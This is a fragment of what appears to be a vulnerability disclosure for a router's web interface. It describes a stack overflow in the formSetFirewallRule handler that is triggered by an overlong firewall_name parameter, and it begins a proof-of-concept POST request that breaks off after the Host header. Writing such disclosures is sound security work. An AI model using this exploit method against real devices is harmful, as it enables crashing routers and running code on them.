...
In `formSetFirewallRule` function, `firewall_name` is directly passed by the attacker, If this part of the data is too long, it will cause the stack overflow, so we can control the `firewall_name` to execute arbitrary code.
...
We set `firewall_name` as **aaaaa......**, and the router will crash, such as:

```http
POST /goform/formSetFirewallRule HTTP/1.1
Host: 192.168.10.1
